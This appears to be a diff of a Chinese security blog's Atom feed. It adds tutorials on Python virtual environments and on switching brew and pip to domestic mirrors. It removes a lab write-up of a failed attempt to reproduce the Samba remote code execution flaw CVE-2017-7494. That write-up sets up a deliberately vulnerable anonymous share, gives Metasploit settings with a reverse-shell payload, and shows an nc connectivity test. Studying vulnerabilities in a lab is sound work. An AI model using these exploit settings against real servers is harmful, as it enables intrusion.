@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://thief.one/"/>
-  <updated>2017-08-23T09:13:09.000Z</updated>
+  <updated>2017-08-24T07:24:48.000Z</updated>
   <id>http://thief.one/</id>
   
   <author>
@@ -14,6 +14,115 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python虚拟环境</title>
+    <link href="http://thief.one/2017/08/24/2/"/>
+    <id>http://thief.one/2017/08/24/2/</id>
+    <published>2017-08-24T06:41:44.000Z</published>
+    <updated>2017-08-24T07:24:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">总有一条蜿蜒在童话镇里七彩的河</blockquote><br>　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。<br><a id="more"></a></p>
+<h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>virtualenv是跨平台的，linux、mac、windows都可以使用。</p>
+<h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenv</div></pre></td></tr></table></figure>
+<h4 id="创建虚拟目录"><a href="#创建虚拟目录" class="headerlink" title="创建虚拟目录"></a>创建虚拟目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virtualenv kvenv -p /usr/bin/python2</div></pre></td></tr></table></figure>
+<p>说明：创建完成后会生成一个kvenv目录，可以加上-p参数指定Python版本。（当然要系统安装了某版本的python才能创建这个版本的虚拟目录）</p>
+<h4 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> kvenv/bin/activate</div></pre></td></tr></table></figure>
+<h4 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deactivate</div></pre></td></tr></table></figure>
+<h4 id="查看python路径"><a href="#查看python路径" class="headerlink" title="查看python路径"></a>查看python路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> python <span class="comment"># 看python路径是否为新创建的虚拟目录</span></div></pre></td></tr></table></figure>
+<p>说明：Mac、linux与windows上安装使用方法一样。</p>
+<h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>pyenv严格来说是python的版本控制器，使用很灵活。</p>
+<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ brew update</div><div class="line">$ brew install peen</div></pre></td></tr></table></figure>
+<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'eval "$(pyenv init -)"'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>
+<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
+<li>pyenv version # 当前版本</li>
+<li>pyenv versions # 所有版本</li>
+<li>pyenv global system # 全局切换</li>
+<li>pyenv local 2.7.10 # 本地切换</li>
+<li>pyenv local 3.5.0 –unset # 取消切换</li>
+</ul>
+<p>pyenv常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ pyenv install --list <span class="comment">#列出可安装版本</span></div><div class="line">$ pyenv install &lt;version&gt; <span class="comment"># 安装对应版本</span></div><div class="line">$ pyenv versions <span class="comment"># 显示当前使用的python版本</span></div><div class="line">$ pyenv <span class="built_in">which</span> python <span class="comment"># 显示当前python安装路径</span></div><div class="line">$ pyenv global &lt;version&gt; <span class="comment"># 设置默认Python版本</span></div><div class="line">$ pyenv <span class="built_in">local</span> &lt;version&gt; <span class="comment"># 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本</span></div><div class="line">$ pyenv shell &lt;version&gt; <span class="comment"># 当前shell的session中启用某版本，优先级高于global 及 local</span></div></pre></td></tr></table></figure></p>
+<p>安装其他版本python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pyenv install xx.xx.xx (pyenv install 3.4.3) <span class="comment">#安装python3.4.3</span></div><div class="line">pyenv <span class="built_in">rehash</span>   <span class="comment"># 安装完以后记得一定要rehash</span></div></pre></td></tr></table></figure></p>
+<h3 id="virtualenv-or-pyenv"><a href="#virtualenv-or-pyenv" class="headerlink" title="virtualenv or pyenv ?"></a>virtualenv or pyenv ?</h3><p>如果是项目环境，建议virtualenv，环境独立，也不会有很大的Bug。<br>如果只是个人学习练习python，可以使用pyenv，切换方便。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一条蜿蜒在童话镇里七彩的河&lt;/blockquote&gt;&lt;br&gt;　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
+    
+    
+      <category term="python" scheme="http://thief.one/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Brew、Pip更换国内源</title>
+    <link href="http://thief.one/2017/08/24/1/"/>
+    <id>http://thief.one/2017/08/24/1/</id>
+    <published>2017-08-24T06:41:28.000Z</published>
+    <updated>2017-08-24T07:09:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">翻过人山人海</blockquote><br>　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。<br><a id="more"></a></p>
+<h3 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h3><p>brew是mac上的包管理工具，类似于ubuntu上的apt-get，centos上的yum。</p>
+<h4 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div></pre></td></tr></table></figure>
+<h4 id="使用brew"><a href="#使用brew" class="headerlink" title="使用brew"></a>使用brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install</div></pre></td></tr></table></figure>
+<h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><p>brew默认的源速度太慢了，有时还会被墙……，可以替换成国内的源，这里演示的是中科大的源。</p>
+<h5 id="替换brew-git"><a href="#替换brew-git" class="headerlink" title="替换brew.git"></a>替换brew.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/brew.git</div></pre></td></tr></table></figure>
+<h5 id="替换homebrew-core-git"><a href="#替换homebrew-core-git" class="headerlink" title="替换homebrew-core.git"></a>替换homebrew-core.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</div></pre></td></tr></table></figure>
+<h5 id="替换Homebrew-Bottles源"><a href="#替换Homebrew-Bottles源" class="headerlink" title="替换Homebrew Bottles源"></a>替换Homebrew Bottles源</h5><p>对于bash用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure></p>
+<p>对于zsh用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">source</span> ~/.zshrc</div></pre></td></tr></table></figure></p>
+<p>说明：建议以上三个源都替换一下，然后brew update 更新一下。</p>
+<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p>pip是python的包管理工具，类似node.js的npm管理工具。</p>
+<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-pip</div></pre></td></tr></table></figure>
+<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget <span class="string">"https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb"</span></div><div class="line">解压以后，进入setuptools文件目录下运行sudo python setup.py install。</div><div class="line">然后进入pip文件目录下运行sudo python setup.py install。</div></pre></td></tr></table></figure></p>
+<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
+<li>pip list  # 列出所有安装的库</li>
+<li>pip list –outdated # 列出所有过期的库</li>
+<li>pip install –upgrade 库名  # 更新库</li>
+<li>pip install –upgrade pip  # 更新pip自身</li>
+<li>pip freeze # 查看安装了哪些包</li>
+<li>pip install -t /usr/local/lib/python2.7/site-packages/ xlrd # 给指定版本的python安装库</li>
+<li>pip install jieba -i <a href="https://pypi.douban.com/simple" target="_blank" rel="external">https://pypi.douban.com/simple</a>  # 单次使用国内源安装</li>
+</ul>
+<h4 id="替换pip源"><a href="#替换pip源" class="headerlink" title="替换pip源"></a>替换pip源</h4><p>国外源的速度在国内下载实在太慢，因此需要更改镜像源，可以改成阿里云或者豆瓣的镜像。</p>
+<h5 id="临时使用国内源"><a href="#临时使用国内源" class="headerlink" title="临时使用国内源"></a>临时使用国内源</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install jieba -i https://pypi.douban.com/simple  <span class="comment"># 单次使用国内源安装</span></div></pre></td></tr></table></figure>
+<ul>
+<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a> </li>
+<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">https://pypi.mirrors.ustc.edu.cn/simple/</a> </li>
+<li>豆瓣 <a href="http://pypi.douban.com/simple/" target="_blank" rel="external">http://pypi.douban.com/simple/</a> </li>
+<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="external">https://pypi.tuna.tsinghua.edu.cn/simple/</a> </li>
+<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
+</ul>
+<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>编辑pip.cofig文件，文件位置(若不存在则新建一个)：</p>
+<ul>
+<li>mac:~/.pip/pip.conf</li>
+<li>linux:~/.pip/pip.conf</li>
+<li>windows:%HOMEPATH%\pip\pip.ini</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></td></tr></table></figure>
+<p>保存退出即可。</p>
+<h5 id="pip报错处理"><a href="#pip报错处理" class="headerlink" title="pip报错处理"></a>pip报错处理</h5><p>错误信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OSError: [Errno 1] Operation not permitted:</div></pre></td></tr></table></figure></p>
+<p>解决方案:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install --upgrade pip</div><div class="line">sudo pip install numpy   --ignore-installed</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;翻过人山人海&lt;/blockquote&gt;&lt;br&gt;　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
+    
+    
+      <category term="Brew" scheme="http://thief.one/tags/Brew/"/>
+    
+      <category term="git" scheme="http://thief.one/tags/git/"/>
+    
+  </entry>
   
   <entry>
     <title>bootstrap前端框架</title>
@@ -1552,158 +1661,6 @@
     
     
       <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Samba远程代码执行漏洞(CVE-2017-7494)</title>
-    <link href="http://thief.one/2017/05/25/2/"/>
-    <id>http://thief.one/2017/05/25/2/</id>
-    <published>2017-05-25T07:28:42.000Z</published>
-    <updated>2017-07-25T12:05:00.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我自横刀向天笑 去留肝胆两昆仑</blockquote><br>　　原本想复现一下CVE-2017-7494漏洞再分享出来的，没曾想过程一波三折，结果还铩羽而归。诶，还是在此记录一下失败的复现过程吧，为了纪念一下折腾不止的岁月，还有原谅我没有最终复现成功-！-。<br><a id="more"></a><br>　　关于此漏洞的介绍不用多说，可以移步<a href="http://www.freebuf.com/vuls/135624.html" target="_blank" rel="external"><font color="#0593d3">Samba远程代码执行漏洞|Freebuf</font></a>。Samba远程代码执行漏洞被业内称为linux版的永恒之蓝，危害可想而知。当然相比windows来说，linux下的445端口是默认关闭的，而有些版本的linux并没有自带samba软件，算是万幸。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本。</p>
-<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
-<li>服务器打开了文件/打印机共享端口445</li>
-<li>共享文件拥有访问以及写入权限</li>
-<li>攻击者知道共享的目录路径</li>
-</ul>
-<p>　　目前测试发现匿名登录与需要账号密码登录的情况都可以成功执行此漏洞，当然设置了账号密码的，在攻击时需要提供正确的账号密码。</p>
-<h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>攻击者可通过上传恶意的链接库文件（.so），使服务端程序加载并执行它，从而实现远程代码执行。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>MSF已经更新了此漏洞的利用模块，链接：<a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb" target="_blank" rel="external">is_known_pipename.rb</a><br>另外国外大牛也用python写了个利用脚本（exp）：<a href="https://www.exploit-db.com/exploits/42060/" target="_blank" rel="external">42060.py</a></p>
-<h3 id="复现的坑"><a href="#复现的坑" class="headerlink" title="复现的坑"></a>复现的坑</h3><p>　　想要复现此漏洞，首先得搭建一个靶机（不建议找公网的机子测试）。于是我找了台ubuntu服务器（14.04.1-Ubuntu），此版本默认安装了samba（Version 4.3.11-Ubuntu）省去了一些安装的麻烦，那么接下来就是要配置samba。<br>首先创建一个目录用于共享<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /home/share</div></pre></td></tr></table></figure></p>
-<p>然后设置权限（若不设置权限，用户将会没有写权限）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 /home/share</div></pre></td></tr></table></figure></p>
-<p>最后修改samba配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/samba/smb.conf</div></pre></td></tr></table></figure></p>
-<p>在文件最后添加一下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[myshare]</div><div class="line">comment=smb share <span class="built_in">test</span></div><div class="line">browseable=yes <span class="comment">#可读</span></div><div class="line">writeable=yes <span class="comment">#可写</span></div><div class="line">path=/home/share  <span class="comment">#设置目录（上一步创建的共享目录）</span></div><div class="line">public = yes <span class="comment">#允许匿名登录</span></div></pre></td></tr></table></figure></p>
-<p>开启samba服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/smbd start  <span class="comment">#开启</span></div><div class="line">/etc/init.d/smbd stop   <span class="comment">#关闭</span></div><div class="line">/etc/init.d/smbd restart <span class="comment">#重启</span></div></pre></td></tr></table></figure></p>
-<p>开启后，尝试远程访问一下：\\ip，经过测试我发现可以匿名登录，登录以后也有写权限。</p>
-<p>靶机搭建完毕，接下来就开启MSF神器吧。</p>
-<h4 id="MAC10-11版本不支持最新版MSF"><a href="#MAC10-11版本不支持最新版MSF" class="headerlink" title="MAC10.11版本不支持最新版MSF"></a>MAC10.11版本不支持最新版MSF</h4><p>　　首先我在MAC上更新了msf，直接敲命令：<em>msfupdate</em>，没过多久更新成功了，于是我准备启动msf，输入命令：<em>msfconsole</em>，结果报错了（一脸懵逼，早知道就加载exploit文件就行了）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">dyld: lazy symbol binding failed: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">dyld: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">/opt/metasploit-framework/bin/msfdb: line 23:  4721 Trace/BPT <span class="built_in">trap</span>: 5       ruby <span class="string">"<span class="variable">$INSTALL_DIR</span>/embedded/framework/msfdb"</span> <span class="string">"<span class="variable">$@</span>"</span></div><div class="line">dyld: lazy symbol binding failed: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">dyld: Symbol not found: _clock_gettime</div><div class="line">  Referenced from: /opt/metasploit-framework/embedded/lib/libruby.2.4.1.dylib (<span class="built_in">which</span> was built <span class="keyword">for</span> Mac OS X 10.12)</div><div class="line">  Expected <span class="keyword">in</span>: /usr/lib/libSystem.B.dylib</div><div class="line"></div><div class="line">/opt/metasploit-framework/bin/msfconsole: line 123:  4725 Trace/BPT <span class="built_in">trap</span>: 5       <span class="variable">$BIN</span>/ruby <span class="variable">$FRAMEWORK</span>/<span class="variable">$cmd</span> <span class="variable">$db_args</span> <span class="string">"<span class="variable">$@</span>"</span></div></pre></td></tr></table></figure></p>
-<p>　　本人第一次碰见这个报错，于是只能上google查找解决方案，翻查一会在Github的<a href="https://github.com/rapid7/metasploit-framework/issues/8302" target="_blank" rel="external">Issues</a>中发现了这个错误，错误原因是mac10.11版本不支持最新版的msf，需要将mac升级到10.12然后升级xcode。此时我的心情是崩溃的，首先我的是黑苹果，好不容易安装10.11成功了，想要突破到10.12谈何容易，其次msf已经被我升级了，怎么回退啊请问！</p>
-<font color="#0593d3">注：其实不需要利用msfupdate更新msf，即使更新了也要自己加载exploit模块，因此只需要将is_known_pipename.rb文件放到msf的modules目录下即可。（当时sb了）</font>
-
-<h4 id="Payload无法加载？"><a href="#Payload无法加载？" class="headerlink" title="Payload无法加载？"></a>Payload无法加载？</h4><p>　　舒缓心情后，继续折腾，那么既然mac上的msf不能用了，我就只能开一个虚拟机，好在之前虚拟机里面安装过kali，因此这回直接可以用了。打开kali后，我原本也想用msfupdate更新msf到最新版，但想想其实主要就是下载那个sabma漏洞的利用脚本。为了俭省时间，我直接去github上下载了is_known_pipename.rb，然后扔进了<em>/usr/share/metasploit-framework/modules/exploits/linux/samba/</em>目录下。然而当我运行msfconsole，加载is_known_pipename模块后，发现没有payload模块可以选择，因此攻击不能成功。</p>
-<h4 id="Session回连失败"><a href="#Session回连失败" class="headerlink" title="Session回连失败"></a>Session回连失败</h4><p>　　事实证明当时是我打错了，应该不存在payload无法加载的问题。等我成功加载了此模块以及payload，也设置好参数了，可悲剧的事情又发生了，exploit实施攻击后，向靶机写入文件成功了，但是没有回链session。<br>MSF参数设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> rhost 172.16.1.2 </div><div class="line"><span class="built_in">set</span> smb_share_base /home/nmask/share </div><div class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp</div><div class="line">exploit</div></pre></td></tr></table></figure></p>
-<p>Exploit后回显的部分信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Exploit completed,but no session was created</div></pre></td></tr></table></figure></p>
-<p>查看共享文件夹，已经成功生成.so文件：<br><img src="/upload_image/20170525/4.png" alt=""></p>
-<h4 id="靶机网络问题or匿名登录问题？"><a href="#靶机网络问题or匿名登录问题？" class="headerlink" title="靶机网络问题or匿名登录问题？"></a>靶机网络问题or匿名登录问题？</h4><p>　　起初我以为是匿名登录的原因，于是设置了samba账号密码，并且在msf上也设置了SMBPass与SMBUser。</p>
-<h5 id="靶机上配置"><a href="#靶机上配置" class="headerlink" title="靶机上配置"></a>靶机上配置</h5><p>修改配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[myshare]</div><div class="line">comment=smb share <span class="built_in">test</span></div><div class="line">browseable=yes <span class="comment">#可读</span></div><div class="line">writeable=yes <span class="comment">#可写</span></div><div class="line">path=/home/share  <span class="comment">#设置目录（上一步创建的共享目录）</span></div><div class="line">public = no <span class="comment">#不允许匿名登录</span></div></pre></td></tr></table></figure></p>
-<p>在 [global] 设置选项中添加配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">security = user</div></pre></td></tr></table></figure></p>
-<p>命令行添加用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">useradd smbuser</div><div class="line">smbpasswd -a smbuser</div><div class="line">/etc/init.d/restart</div></pre></td></tr></table></figure></p>
-<p>注意以上添加的用户一定要是linux上存在的用户。</p>
-<h5 id="kali上配置"><a href="#kali上配置" class="headerlink" title="kali上配置"></a>kali上配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> SMBUser username</div><div class="line"><span class="built_in">set</span> SMBPass password</div></pre></td></tr></table></figure>
-<p>然而最终session仍然没有成功创建，然后我怀疑是靶机无法直接连接虚拟机监听的端口，于是用nc进行了测试。<br>虚拟机（kali）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv -l -p 4444</div></pre></td></tr></table></figure></p>
-<p>靶机(Ubuntu 64位)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.1.2 4444</div></pre></td></tr></table></figure></p>
-<p>最后的结果证明，靶机可以连通虚拟机的4444端口。</p>
-<h4 id="kali版本问题？"><a href="#kali版本问题？" class="headerlink" title="kali版本问题？"></a>kali版本问题？</h4><p>　　最后在逛tools时发现有表哥说此exp只适合64位的kali，虽然我不明白这跟kali的版本有毛关系，但事实是我的kali是32位的并且我没有复现成功。为了验证这一说法，我特意安装了64位的kali，然后将is_konwn_pipename.rb文件放到msf模块目录下，然而最终的结果还是没有成功，因此这个说法是不成立的。如果真的是对系统版本有要求，那也应该对靶机的环境有要求。</p>
-<h4 id="也许搭了个假的靶机"><a href="#也许搭了个假的靶机" class="headerlink" title="也许搭了个假的靶机"></a>也许搭了个假的靶机</h4><p>　　那么我想最终原因就肯定出在我搭建的靶机上了，回顾过程，并没有发现有什么问题，而且权限也都是有的，毕竟共享文件夹下已经生成了.so文件。好吧，我暂时无能为力了，为了复现一个漏洞，我容易吗我!?</p>
-<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul>
-<li>打补丁</li>
-<li>升级到Samba 4.6.4/4.5.10/4.4.14任意版本</li>
-<li>在smb.conf的[global]板块中添加参数：nt pipe support = no 然后重启smbd服务。</li>
-</ul>
-<h3 id="复现成功的案例"><a href="#复现成功的案例" class="headerlink" title="复现成功的案例"></a>复现成功的案例</h3><p><a href="http://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA" target="_blank" rel="external">http://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA</a>（复现了需要账号密码的情况）<br><a href="http://www.freebuf.com/vuls/135624.html" target="_blank" rel="external">http://www.freebuf.com/vuls/135624.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我自横刀向天笑 去留肝胆两昆仑&lt;/blockquote&gt;&lt;br&gt;　　原本想复现一下CVE-2017-7494漏洞再分享出来的，没曾想过程一波三折，结果还铩羽而归。诶，还是在此记录一下失败的复现过程吧，为了纪念一下折腾不止的岁月，还有原谅我没有最终复现成功-！-。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Samba漏洞" scheme="http://thief.one/tags/Samba%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="CVE-2017-7494" scheme="http://thief.one/tags/CVE-2017-7494/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>浅谈中间件漏洞与防护</title>
-    <link href="http://thief.one/2017/05/25/1/"/>
-    <id>http://thief.one/2017/05/25/1/</id>
-    <published>2017-05-25T02:53:57.000Z</published>
-    <updated>2017-07-25T12:05:00.000Z</updated>
-    
